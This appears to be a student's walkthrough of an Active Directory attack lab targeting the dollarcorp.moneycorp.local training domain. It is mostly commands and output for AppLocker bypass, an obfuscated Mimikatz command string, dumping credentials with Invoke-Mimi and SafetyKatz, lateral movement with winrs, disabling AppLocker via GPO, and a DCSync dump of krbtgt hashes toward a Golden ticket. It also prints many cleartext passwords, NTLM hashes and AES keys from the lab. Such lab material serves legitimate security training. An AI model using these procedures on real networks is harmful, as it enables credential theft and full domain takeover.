* C:\Users\student731> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d

**A default rule is enabled that allows everyone to run scripts from the C:\ProgramFiles folder**

* PS C:\Users\student731> Enter-PSSession dcorp-adminsrv
* [dcorp-adminsrv]: PS C:\Users\student731\Documents> $ExecutionContext.SessionState.LanguageMode
```
ConstrainedLanguage
```

* [dcorp-adminsrv]: PS C:\Users\student731\Documents> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
PathConditions : {%PROGRAMFILES%\*}
PathExceptions : {}
PublisherExceptions : {}
HashExceptions : {}
Id : 06dce67b-934c-454f-a263-2515c8796a5d
Name : (Default Rule) All scripts located in the Program Files 
folder
Description : Allows members of the Everyone group to run scripts 
that are located in the Program Files folder.
UserOrGroupSid : S-1-1-0
Action : Allow
PathConditions : {%WINDIR%\*}
PathExceptions : {}
PublisherExceptions : {}
HashExceptions : {}
Id : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name : (Default Rule) All scripts located in the Windows 
folder
Description : Allows members of the Everyone group to run scripts 
that are located in the Windows folder.
UserOrGroupSid : S-1-1-0
Action : Allow
```

![alt text](image-39.png)

**"Everyone" can run scripts from the Program Files directory. That means, we can drop scripts in the Program Files directory there and execute them**

**Also, in the Constrained Language Mode, we cannot run scripts using dot sourcing (. .\Invoke-Mimi.ps1). So, we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimiEx.ps1) to the target server**

## Create Invoke-MimiEx-keys-std731.ps1
* 1 - Open Invoke-MimiEx-keys-std731.ps1 in PowerShell ISE (Right click on it and click Edit) 
* 2 - Add the below encoded value for "sekurlsa::ekeys" to the end of the file.
```
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$l = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$1 = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + 
$1 ;
Invoke-Mimi -Command $Pwn
```

**On student machine run the following command from a PowerShell session**
* PS C:\AD\Tools> Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-std731.ps1 \\\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\\'Program Files'

* [dcorp-adminsrv]: PS C:\Program Files> ls

![alt text](image-40.png)

* [dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> .\Invoke-MimiEx-keys-std731.ps1

![alt text](image-41.png)

```
Authentication Id : 0 ; 139020 (00000000:00021f0c)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/15/2025 2:57:30 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1117

         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
         * Key List :
           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7
           rc4_md4           d549831a955fee51a43c83efb3928fa7
           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7

Authentication Id : 0 ; 138962 (00000000:00021ed2)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/15/2025 2:57:30 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1114
         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
         * Key List :
           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
           aes128_hmac       86a353c1ea16a87c39e2996253211e41
           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f
           rc4_md4           cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f


Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/15/2025 2:57:15 AM
SID               : S-1-5-18

         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

```

**Here we find the credentials of the dcorp-adminsrv$, appadmin and websvc users**

### Create Invoke-MimiEx-vault-std731.ps1

**There are other places to look for credentials. Let’s modify Invoke-MimiEx and look for credentials from the Windows Credential Vault**

<p>
Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx-vault-stdx.ps1 (where x is 
your student ID). 
- Open Invoke-MimiEx-vault-stdx.ps1 in PowerShell ISE (Right click on it and click Edit). 
- Replace "Invoke-Mimi -Command '"sekurlsa::ekeys"' " that we added earlier with 
"Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"' " (without quotes).
</p>

![alt text](image-42.png)

### Copy Invoke-MimiEx-vault-stdx.ps1 to dcorp-adminsrv and run it

* PS C:\AD\Tools> Copy-Item C:\AD\Tools\Invoke-MimiEx-vault-stdx.ps1 \\\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
* .\Invoke-MimiEx-vault-std731.ps1

```
[snip]
mimikatz(powershell) # token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM
[snip]
mimikatz(powershell) # vault::cred /patch
TargetName : Domain:batch=TaskScheduler:Task:{D1FE8F15-FC32-486B-94BC-471E4B1C1BB9} / <NULL>
UserName : dcorp\srvadmin
Comment : <NULL>
Type : 2 - domain_password
Persist : 2 - local_machine
AlteredSecurity Attacking and Defending Active Directory 57
Flags : 00004004
Credential : TheKeyUs3ron@anyMachine!
Attributes : 0
```

**We got credentials for the srvadmin user in clear-text! Start a cmd process using runas. Run the below command from an elevated shell**

* C:\Windows\system32> runas /user:dcorp\srvadmin /netonly cmd
```
Enter the password for dollarcorp.moneycorp.local\srvadmin:
Attempting to start cmd as user "dollarcorp.moneycorp.local\srvadmin" ...
[snip]
```

**The new process that starts has srvadmin privileges. Check if srvadmin has admin privileges on any other machine.**

* C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
* PS C:\Windows\system32> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
* PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```
VERBOSE: Trying to run a command parallely on provided computers list using 
PSRemoting .
dcorp-mgmt
dcorp-adminsrv
```

**We have local admin access on the dcorp-mgmt server as srvadmin and we already know a session of svcadmin is present on that machine**

**Let's use SafetyKatz to extract credentials from the machine. Run the below commands from the process running as srvadmin.**

**Copy the Loader.exe to dcorp-mgmt**

* C:\Windows\system32>echo F | xcopy C:\AD\Tools\Loader.exe \\\dcorp-mgmt\C$\Users\Public\Loader.exe
```
Does \\dcorp-mgmt\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

* C:\Windows\system32> winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
```
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/15/2025 2:57:31 AM
SID               : S-1-5-20

         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 21282 (00000000:00005322)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/15/2025 2:57:31 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 21243 (00000000:000052fb)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/15/2025 2:57:31 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 1074392 (00000000:001064d8)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/15/2025 4:28:36 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1120

         * Username : mgmtadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa
           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754
           rc4_md4           95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754

Authentication Id : 0 ; 1057960 (00000000:001024a8)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/15/2025 4:28:32 AM
SID               : S-1-5-96-0-2

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 789142 (00000000:000c0a96)
Session           : Interactive from 0
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/15/2025 3:52:37 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1120

         * Username : mgmtadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa
           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754
           rc4_md4           95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754

Authentication Id : 0 ; 118660 (00000000:0001cf84)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/15/2025 2:57:39 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8

Authentication Id : 0 ; 56978 (00000000:0000de92)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 1/15/2025 2:57:35 AM
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/15/2025 2:57:30 AM
SID               : S-1-5-18

         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754
```

### Disable Applocker on dcorp-adminsrv by modifying GPO

<p>Recall that we enumerated that studentx has Full Control/Generic All on the Applocked Group Policy. Let's make changes to the Group Policy and disable Applocker on dcorp-adminsrv.</p>

![alt text](image-43.png)

![alt text](image-44.png)

<p>We need the Group Policy Management Console for this. 
As the student VM is a Server 2022 machine, we can install it using the following steps: 
Open Server Manager -> Add Roles and Features -> Next -> Features -> Check Group Policy Management -> Next -> Install

After the installation is completed, start the gpmc. 
We need to start a process as studentx using runas, otherwise gpmc doesn't get the user context. Run the below command from an elevated shell</p>

* C:\Windows\system32>runas /user:dcorp\studentx /netonly cmd
```
Enter the password for dcorp\studentx:
Attempting to start cmd as user "dcorp\studentx" ...
```

**Run the below command in the spawned cmd**
* C:\Windows\system32>gpmc.msc

<p>In gpmc, expand Forest -> Domains -> dollarcorp.moneycorp.local -> Applocked -> Right click on the 
Applocker policy and click on Edit.</p>

![alt text](image-45.png)

<p>In the new window, Expand Policies -> Windows Settings -> Security Settings -> Application Control 
Policies -> Applocker.</p>

![alt text](image-46.png)

<p>Start looking at each category of the Applocker policies.</p>

* 1 - In the 'Executable Rules', 'Everyone' is allowed to run Microsoft signed binaries. 
* 2 - In the 'Script Rules', 'Everyone' can run Microsoft signed scripts from any location and two default rules where 'Everyone' can run Microsoft signed scripts from 'C:\Windows' and 'C:\Program Files' folders. 

![alt text](image-47.png)

<p>We can either wait for the Group Policy refresh or force an update on the dcorp-adminsrv machine.</p>

* C:\>winrs -r:dcorp-adminsrv cmd
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.
```
* C:\Users\studentx>gpupdate /force
``` 
gpupdate /force
Updating policy...
Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

**let's copy Loader on the machine and use it to run SafetyKatz**

* C:\AD\Tools> echo F | xcopy C:\AD\Tools\Loader.exe \\\dcorp-adminsrv\C$\Users\Public\Loader.exe

### Access the dcorp-adminsrv
* C:\AD\Tools> winrs -r:dcorp-adminsrv cmd
* C:\Users\studentx> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 
connectport=80 connectaddress=172.16.100.x
```

* C:\Users\studentx> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
* C:\Users\studentx> C:\Users\Public\Loader.exe -path http://172.16.100.31/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```
Authentication Id : 0 ; 139020 (00000000:00021f0c)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/15/2025 2:57:30 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1117

         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
         * Key List :
           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7
           rc4_md4           d549831a955fee51a43c83efb3928fa7
           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/15/2025 2:57:16 AM
SID               : S-1-5-20

         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 22514 (00000000:000057f2)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/15/2025 2:57:16 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 925163 (00000000:000e1deb)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/15/2025 4:25:52 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1115

         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4
           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728
           rc4_md4           a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728

Authentication Id : 0 ; 882425 (00000000:000d76f9)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/15/2025 4:20:37 AM
SID               : S-1-5-96-0-2

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 138962 (00000000:00021ed2)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/15/2025 2:57:30 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1114

         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
         * Key List :
           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
           aes128_hmac       86a353c1ea16a87c39e2996253211e41
           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f
           rc4_md4           cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f

Authentication Id : 0 ; 22542 (00000000:0000580e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/15/2025 2:57:16 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/15/2025 2:57:15 AM
SID               : S-1-5-18

         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565
```

**We were able to disable Applocker. Please note that modification to GPO is not OPSEC safe but still commonly abuse by threat actors**

## Learning Objective 8:
```
• Extract secrets from the domain controller of dollarcorp.
• Using the secrets of krbtgt account, create a Golden ticket. 
• Use the Golden ticket to (once again) get domain admin privileges from a machine
```

### We have domain admin privileges! Let's extract all the hashes on the domain controller.
### Run the below command from an elevated command prompt (Run as administrator)

* C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin  /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

### Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to  extract credentials

* C:\Windows\system32> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
* C:\Windows\system32> winrs -r:dcorp-dc cmd
* C:\Users\svcadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.31

### INFO: Make sure you have a SafetyKatz on HFS and Firewall Off
* C:\Users\svcadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"

```
mimikatz(commandline) # lsadump::evasive-lsa /patch
Domain : dcorp / S-1-5-21-719815819-3726368948-3917688648

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 4e9815869d2090ccfca61c1fe0d23986

RID  : 00000459 (1113)
User : sqladmin
LM   :
NTLM : 07e8be316e3da9a042a9cb681df19bf5

RID  : 0000045a (1114)
User : websvc
LM   :
NTLM : cc098f204c5887eaa8253e7c2749156f

RID  : 0000045b (1115)
User : srvadmin
LM   :
NTLM : a98e18228819e8eec3dfa33cb68b0728

RID  : 0000045d (1117)
User : appadmin
LM   :
NTLM : d549831a955fee51a43c83efb3928fa7

RID  : 0000045e (1118)
User : svcadmin
LM   :
NTLM : b38ff50264b74508085d82c69794a4d8

RID  : 0000045f (1119)
User : testda
LM   :
NTLM : a16452f790729fa34e8f3a08f234a82c

RID  : 00000460 (1120)
User : mgmtadmin
LM   :
NTLM : 95e2cd7ff77379e34c6e46265e75d754

RID  : 00000461 (1121)
User : ciadmin
LM   :
NTLM : e08253add90dccf1a208523d02998c3d

RID  : 00000462 (1122)
User : sql1admin
LM   :
NTLM : e999ae4bd06932620a1e78d2112138c6

RID  : 00001055 (4181)
User : studentadmin
LM   :
NTLM : d1254f303421d3cdbdc4c73a5bce0201

RID  : 000042cd (17101)
User : devopsadmin
```

### To get NTLM hash and AES keys of the krbtgt account, we can use the DCSync attack. 
### Run the below command from process running as Domain Admin on the student VM

* https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

```
** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
